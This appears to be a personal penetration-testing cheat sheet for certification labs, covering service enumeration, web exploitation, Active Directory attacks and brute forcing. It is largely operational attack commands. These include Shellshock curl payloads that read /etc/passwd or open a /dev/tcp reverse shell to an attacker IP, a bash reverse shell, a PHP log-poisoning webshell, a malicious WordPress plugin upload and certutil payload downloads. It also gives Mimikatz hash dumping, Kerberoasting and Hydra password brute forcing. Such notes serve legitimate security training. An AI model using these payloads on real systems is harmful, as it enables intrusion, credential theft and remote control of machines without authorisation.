## `nmap` Scripts
Scripts for [nmap](https://nmap.org/) can be found in (`nmap` is in [Kali Linux tools](https://www.kali.org/tools/nmap/)):
	`/usr/share/nmap/scripts`

To search for scripts regarding specific ports, try:
	`ls /usr/share/nmap/scripts| grep SERVICENAME`

If using scripts, put them first:
	`sudo nmap --script=smb-os-discovery -sSV -p 445 -Pn [TARGET]`

You can also run wildcards for scripts:
	`sudo nmap --script=smb* -sSV -p 445 -Pn [TARGET]`

Some scripts I have personally found useful:
	`smb-os-discovery`
	`snmp-brute` * (I've had some difficulties with it, try hydra or something else too)
	`smtp-brute`
	`smtp-commands`
	`smtp-enum-users`
## (53) Domain Enum
DNS Enumeration might give you information on other hosts in the network.
Keep in mind, you will probably have to mess with `/etc/conf` for this!!!

If you are looking for DNS servers specifically, use nmap to quickly and easily search:
	`nmap -sU -p53 ​[NETWORK]`

Normal DNS Query:
	`nslookup ​[TARGET]` 

Query for MX Servers within a domain:
	`dig ​[DOMAIN] ​MX`

Query for Name Servers within a domain:
	`dig ​[DOMAIN] ​NS`

DNS Zone Transfer (This will give you all of the marbles!)
	`dig axfr @​[NAMESERVER] [DOMAIN]`
	`dnsrecon -d ​domain ​-a --name_server ​server`

If you want to brute force subdomain enum, try `dnsmap`:
	`dnsmap ​domain`
## (137/138/445) NetBIOS/SMB Enum
This is where I got most of my exploitation and system info on my eCPPT.  It's a great source of info.
USE YOUR NMAP SCRIPTS HERE!!!!

To probe NetBIOS info:
	`nbtscan -v ​[TARGET]`
	The hex codes reference different services.  You can [look up](http://www.pyeung.com/pages/microsoft/winnt/netbioscodes.html) what they mean, but 20 means File Sharing services.

To list what resources are being shared on a system:
	`smbclient -L ​[TARGET]`

To display share information on a system:
	`nmblookup -A ​[TARGET]`

[Enum4linux](https://github.com/CiscoCXSecurity/enum4linux) is a great tool to gather information through SMB (*note, it tests anonymous login only by default*)(It is included in [Kali Linux tools](https://www.kali.org/tools/enum4linux/).)
	`enum4linux ​[TARGET]`

If you want to brute force, you can try nmap scripts, but I personally like using [Hydra](https://github.com/vanhauser-thc/thc-hydra) for this (Hydra is in [Kali Linux tools](https://www.kali.org/tools/hydra/)):

You can experiment with different wordlists, but in an ideal situation, you'll have at least the user.  Otherwise this will take forever!!!!
	`hydra -l [USER] -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt smb://[TARGET]/ -V -I`   

SambaCry and EternalBlue might be there
		`nmap --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -p445 10.11.1.146 -Pn`

## (161/162) SNMP Enum
The thing about SNMP is that it operates using community strings.  It's a fancy ass way of saying it sends passwords when it sends data.
- SNMPv1 is all cleartext, so it is easy to grab the string
- SNMPv2 has some inherent weaknesses allowing it to be grabbed 2
- SNMPv3 is encrypted, but it can be brute forced.

There are 2 kinds of community strings: Public and Private.
- Public - Read Access
- Private - Write Access

You can use [Wireshark](https://www.wireshark.org/) to sniff for SNMP traffic for SNMPv1 and 2. (Wireshark is in [Kali Linux Tools](https://www.kali.org/tools/wireshark/.))

You can also brute-force the string with `nmap` or `hydra`:
	`nmap --script=snmp-brute [TARGET]`
	`hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt snmp://[TARGET]/`

Once you have the community string through whatever method, you can then start to grab information from it.
	`snmpwalk -c ​[COMMUNITY_STRING] ​-v ​[SNMP_VERSION] [TARGET]`

If you know what OID you are looking for, you can actually search for specific parameters:
	`snmpwalk -c ​[COMMUNITY_STRING] ​-v ​{SNMP_VERSION] [TARGET] [OID]`

Useful OIDs (*Windows*)

Object Identifier (OID) | Type of Info
--- | ---
1.3.6.1.2.1.25.1.6.0 | System Processes
1.3.6.1.2.1.25.4.2.1.2 | Running Programs
1.3.6.1.2.1.25.4.2.1.4 | Processes Path
1.3.6.1.2.1.25.2.3.1.4 | Storage Units
1.3.6.1.2.1.25.6.3.1.2 | Software Name
1.3.6.1.4.1.77.1.2.25  | User Accounts
1.3.6.1.2.1.6.13.1.3 | TCP Local Ports

Honestly, I recommend just using `snmpenum` to gather info:
`snmpenum [TARGET] [COMMUNITY STRING] [CONFIG FILE]`
	config files are in `/usr/share/snmpenum/`

You can even overwrite and set some OIDs if things are misconfigured:
`snmpset -c [COMMUNITY_STRING] -v [SNMP_VERSION] [OID] [VALUE]`

Useful Nmap Scripts:
`snmp-brute`
`snmp-win32-services.nse`
`snmp-win32-shares.nse`
`snmp-win32-software.nse`
`snmp-win32-users.nse`

## (21) FTP
Try anonymous login first, you'd be surprised how often it works....
Other than that, all you can do is brute force or look for a version specific exploit...

Be sure to set type to `binary`if you are transferring exes...Unsure if it affects linux or not.

But exes will straight up not work if that setting isn't set

## (80/443/8080) Web Servers
Web servers are the most interesting of the enumeration targets, since they have the most running parts

- Check for `robots.txt` and `sitemap.xml`!
- Check for admin consoles for respective apps (**MySQL**, **Tomcat**, **phpmyadmin**, etc)

The first step is opening up the web page and just giving it a once-over.  Look and see if there is anything interesting in the source.
	- Usernames, passwords, IPs of other machines?
	- places to input data to get some SQLi or XSS done.

Also, have `gobuster/dirbuster` running in the background to try and uncover hidden web pages.
	 `gobuster dir -e -u http://[TARGET]/ -w /usr/share/wordlists/dirb/common.txt -x php,htm,html,bak,old`

If you find `cgi-bin` and are forbidden to access it, you can still brute force the cgi names to test for *shellshock* vuln
	`gobuster dir -u http://[IP]/ -e -s "200,204,403,500" -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt`
	`dirbuster` is GUI, so you might have an easier time.

Also make note of what framework and OS the webserver is using.  Might help you know what tools are installed on the system.
	`gobuster dir -e -u http://[IP]/ -w /usr/share/wordlists/dirb/common.txt -x php,htm,html,bak,old`

**BASELINE SCAN**
	`gobuster dir -u http://[IP]/ -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -k`

**NIKTO IS GOD!!**

While I like `gobuster`, `dirb` is recursive....
	`dirb http://[TARGET] -z 10`

**Burp Suite** is genuinely the best tool for testing web requests and in some cases exploitation.

Useful `nmap` scripts:
	`http-shellshock --script-args uri=[PATHTOCGI]`

	`curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://[IP]/cgi-bin/user.sh`

	`curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/[IP]/53 0>&1' http://[IP]/cgi-bin/user.sh`

`wpscan` is good for **Wordpress** shit.
- combine with searchsploit, and fiddle with names.  Spaces instead of hyphens, one word only, etc

**LOG POISONING**
`<?php echo system($_GET['cmd']); ?>`
- Then submit `&cmd=[COMMAND]`

**BASH**  SHELL FOR REVERSE WEB
**URL** ENCODE IT
- `bash -c "bash -i >& /dev/tcp/[IP]/4444 0>&1"`

`php://filter` and `php://data` wrappers are gonna be big!


I LIKE THIS WEBSHELL A LOT!
[WhiteWinterWolf webshell](https://github.com/WhiteWinterWolf/wwwolf-php-webshell)(link to github repo). Project homepage is [here](https://www.whitewinterwolf.com/tags/php-webshell/)
### WORDPRESS
`wpscan` is your friend.

API KEY
{REDACTED}

`/wp-admin` is the admin login page.

If you get into the admin page, you can upload malicious plugins.
Plugins are defined as a zip file with 2 php files inside.
- One will need to be an php file formatted as so:
```php
<?php
/*
* Plugin Name: Quirkyshell
* Version: 1
* Author: FuckYou
* Author URI: http://Pornhub.com
* License: GPL2
*/
?>
```
- The other will need to be your malicious payload.
- The files will be accessible from the following link:
	`http://(target)/wp-content/plugins/[ZIPFILENAME]/[PHPFILENAME]`

**THE ABOVE ISN'T TRUE, SO LONG AS THE INFO ON PART 1 IS INCLUDED IN THE PHP FILE, WP WILL TAKE IT**
### IIS
USE ASP PAYLOADS

`C:\inetpub\wwwroot`
## (22) SSH
You can connect to the `ssh` service via `netcat` to grab the banner and search the version for OS info.
	`nc -nv [TARGET] 22`

Might need to brute force.  Ideally you'll at least have a username for this.

Useful nmap scripts:
	`ssl-heartbleed.nse`
## (111) NFS
NFS is a thing for linux that lets you mount and access files on a remote system as if they were on your local machine.

RPC binds to 111 and you can use that port to enumerate other services using `rpc` (rpc-info script)

- You can then use the [[#nmap Scripts]] to gather as much info on the nfs side as possible.
	`nmap -p 111 --script nfs* [TARGET]`

- Then you can mount the shared drive to your own machine and dig into it.
	`sudo mount -o nolock [TARGETIP]:/[SHAREDDIR] [LOCALMOUNTPOINT]`

- If you cannot access the file, you may need to check what UUID is allowed to view the file.
	`ls -l`

- And then create a new user on your local machine:
	`adduser`

- And then change the UUID of the newly created user:
	`sudo sed -i -e 's/[CURRENTUUID]/[NEWUUID]/g' /etc/passwd`

- Check and make sure the command ran properly:
	`cat /etc/passwd|grep [USER]`

- Then `su` to the new user and read away.

Useful nmap scripts:
`rpc-info`
`nfs-ls`
`nfs-showmount`
`nfs-statfs`
## (25) SMTP
- `VRFY` command tells if an email address exists.

- `EXPN` command shows membership of mailing list

- Keep in mind, if you have any exploits for this service, you may need a valid email address as a RCPT.
## (6667 and up) IRC Chat
Useful commands:

Login with NC, **Hexchat** has given me so much shit...
	`USER QuirkyKirk 0 * QuirkyKirk`
	`NICK H@CK3R`

**Hexchat** works, just make sure to search for all channels with 0 to 9999 users!!!

`ADMIN`
`LIST`
## Active Directory Tools

[**PowerView.ps1**](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) is great for enumeration.  Here are some example commands:

To Get all Computer OS on the domain:
	`Get-NetComputer -fulldata | select operatingsystem`

To Get all users on Domain:
	`Get-NetUser | select cn`
	[HarmJ0y's PowerView 3.0 tips and tricks](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)

[**Mimikatz**](https://github.com/gentilkiwi/mimikatz/releases) (Link to Mimikatz releases on GitHub)

	`net user /domain`

	`net group /domain`

`GetNPUsers.py`is great for grabbing the users with no pre auth. Try using this after getting a list of usernames.

-----------------------------------
**EXPERIENCE FROM LAB...**

Get initial foothold **AND** Privesc to SYSTEM.  Can't really say much there, you just gotta do it.

(Or look for usernames.  If you find a bunch of users, put them in a txt file and run `GetNPUsers.py` to `ASREPROAST`.  This will give you credentials to login potentially.)
```python
python GetNPUsers.py <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
```

If you already got into a machine and escalated:

Go ahead and transfer a series of post exploitation tools to the system however you like.  You could use `smbserver.py` and copy that way, or use `certutil` to download from your own host http server.  `Smbserver.py` is better because you can run without ever touching the disk on the victim system, but for a CTF, I like putting my stuff on the disk.  SMB also lets you evade antivirus in some cases....Not really a factor in OSCP though.

**ON ATTACKING MACHINE**
```python
smbserver.py share . -smb2support -username test -password test
# Note, `smb2` is a little flaky, might need to fuck around a bit with it.
python -m SimpleHTTPServer 80
```

**ON VICTIM**
```
\\[IP]\share\[FILENAME]
certutil.exe -urlcache -split -f http://[IP]/[FILENAME] [DEST FILENAME]
```
 
**Recommended Tools**
[adPEAS](https://github.com/61106960/adPEAS)
[Mimikatz](https://github.com/ParrotSec/mimikatz)
[Rubeus](https://github.com/GhostPack/Rubeus)
[Sharphound](https://github.com/BloodHoundAD/SharpHound) (technically not needed, but want to mention)
[Chisel](https://github.com/jpillora/chisel) (Just need to copy the exe client over if you are doing on Windows...Which you will if its AD lol)

-----------------------------------
So...If you are in the system, and you have escalated privs, you need to do some post exploitation.  I like to lead in with **adPEAS**, since it automates a lot of the process.

```powershell
#Start Powershell
powershell.exe
#Import the adPEAS module
Import-Module ./adPEAS.ps1
#Run adPEAS
Invoke-AdPEAS
```

And now you wait for things to happen.  It will begin searching for SPNs, kerberoastable accounts, and exporting a bunch of domain info to a .zip file for **[Bloodhound](https://github.com/SpecterOps/BloodHound)**.  At this point I would look through the text output and see what you have.  if you have any kerberoastable accounts, try to crack the hashes with **[hashcat](https://github.com/hashcat/hashcat)**.  Not gonna put **hashcat** commands here bc I respect your intelligence.  Look for high value targets, see what your goal should be.

The biggest thing is to transfer the .zip file back to your machine and import it into **Bloodhound**.  Copy it to an SMB share if you can.  This can help visualize targets.

- Remember to enter this command to start the database before launching **Bloodhound**
	`neo4j console`

Then just drag the zip into **Bloodhound** and mess with it.  I'm being vague here so you can figure some of this out.  Try a bunch of different things on the analysis tab, and see what you can find.  Look for domain admins, how to get there, and what accounts you have access to and what they are good for.  Learn to be comfortable with **Bloodhound**.

If **adPEAS** didn't get you any credentials or valuable info, you might need to run **Rubeus** or **Mimikatz** manually.  Or you might need to enumerate better, maybe theres something else you can find locally...Services, config files...backups?

- Run to get hashes of kerberoastable accounts. Use **Bloodhound** to see if they are worth anything.
	`rubeus.exe kerberoast`
- If you want to do this remotely (NEED CREDS, AND ABILITY TO TOUCH DC):
	`GetUserSPNs.py [DOMAIN]/[ACCT]:[PASSWD] -dc-ip [DCIP] -request`

**Mimikatz** is a beast of a program, but Im gonna just throw the most important commands.  Worth going through the Post-Exploitation Basics room on THM to learn this better.
`mimikatz.exe`

`privilege::debug` (If you get anything other than 20 OK, you dun fucked up)

Export tickets on machine:
	`sekurlsa::tickets /export`
Dump Local hashes
	`lsadump::sam`

From there, its sort of unknown what you'll run into.  If you have trouble accessing other machines, consider using **Chisel** to pivot from your first one.  AD is made for computers to communicate with each other, so they should have some inter-connectivity. [How to pivot with Chisel](https://ap3x.github.io/posts/pivoting-with-chisel/)

- Make sure your `proxychains` config file is setup properly and make sure you preceded your pivoted commands with `sudo proxychains` or `sudo proxychains4`.

In an AD environment, `evil-winrm` and `xfreerdp` are you friend for accessing systems.
`evil-winrm` will only give you a **powershell** interface....So be ready for that.  But it also has an integrated upload function, so that's sick.  No need to host your own servers.  Download also works.  Might be usable on first machine if you have creds.  hit or miss.

`xfreerdp` might or might not work, RDP isn't guarunteed...But do note if you try to run *Mimikatz* on a GUI, you'll need to run it as `admin`, or in a `cmd` that is running as `admin`.  UAC stops it otherwise.

You can totally port scan through **Chisel**, but I would limit it to only the top 100 ports or so.  It'll take a while to run, and also pretty sure you can only do TCP scans over a pivoted session.  No Ping either I think.


## How Kerberos Works
1. AS-REQ - The client requests an Authentication Ticket or Ticket Granting Ticket (TGT).

2. AS-REP - The Key Distribution Center verifies the client and sends back an encrypted TGT.

3. TGS-REQ - The client sends the encrypted TGT to the Ticket Granting Server (TGS) with the Service Principal Name (SPN) of the service the client wants to access.

4. TGS-REP - The Key Distribution Center (KDC) verifies the TGT of the user and that the user has access to the service, then sends a valid session key for the service to the client.

5. AP-REQ - The client requests the service and sends the valid session key to prove the user has access.

6. AP-REP - The service grants access


The main ticket that you will see is a **Ticket Granting Ticket** (TGT) (these can come in various forms such as a `.kirbi` for **Rubeus** `.ccache` for **Impacket**). The main ticket that you will see is a `.kirbi` ticket.

A ticket is typically base64 encoded and can be used for various attacks. The TGT is only used with the KDC in order to get service tickets. Once you give the TGT the server then gets the User details, session key, and then encrypts the ticket with the service account NTLM hash. Your TGT then gives the encrypted timestamp, session key, and the encrypted TGT. The KDC will then authenticate the TGT and give back a service ticket for the requested service. A normal TGT will only work with that given service account that is connected to it however a KRBTGT allows you to get any service ticket that you want allowing you to access anything on the domain that you want.

Attack Privilege Requirements:
- Kerbrute Enumeration - No domain access required 
- Pass the Ticket - Access as a user to the domain required
- Kerberoasting - Access as any user required
- AS-REP Roasting - Access as any user required
- Golden Ticket - Full domain compromise (domain admin) required 
- Silver Ticket - Service hash required 
- Skeleton Key - Full domain compromise (domain admin) required
## Enumerating Kerberos
**ADD THE DNS NAME TO YOUR `etc/hosts` FILE!!!**

ENUMERATE ACCOUNTS ON DC 
	`kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt`

Check for users on 445 with RPC
```
rpcclient -U "" -N [IP]
enumdomusers
querygroup 0x200
querygroupmem 0x200
queryuser 0x1f4
```
## Steganography
`binwalk` is your friend

`binwalk -e -M [FILE]`

`strings` is a useful tool for this...Also generally useful for special binaries...
## Brute Forcing
**HYYYYYDRAAA**

THIS IS THE ONE YOU ALWAYS HAVE TROUBLE REMEMBERING! **HTTP(S) BRUTE FORCE!!**
```
hydra -l '' -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt [IP] https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect"
```
`"LOGINPAGE:PARAMETERS:FAILMESSAGE"`
- Try using `cewl` for wordlist if `rockyou` isnt doing it for you

"PAGE TO BRUTEFORCE:VARIABLES TO PASS:THE INVALID PAGE WORD TO SEARCH FOR"
*NOTE: THERE IS `HTTP-GET-FORM` AS WELL AS `HTTPS-POST-FORM`*

USE `ROCKYOU.TXT` AND `XATO TEN THOUSAND`!  LET THEM RUN ALL THE WAY!!! ([Kali Linux Tools](https://www.kali.org/tools/wordlists/)wordlists includes RockYou.)(Burnett's [10 million passwords](https://archive.org/details/10MillionPasswords)from the Archive.)

**Hashcat** is where its at for local hashes...it's pretty self explanatory, not throwing notes...
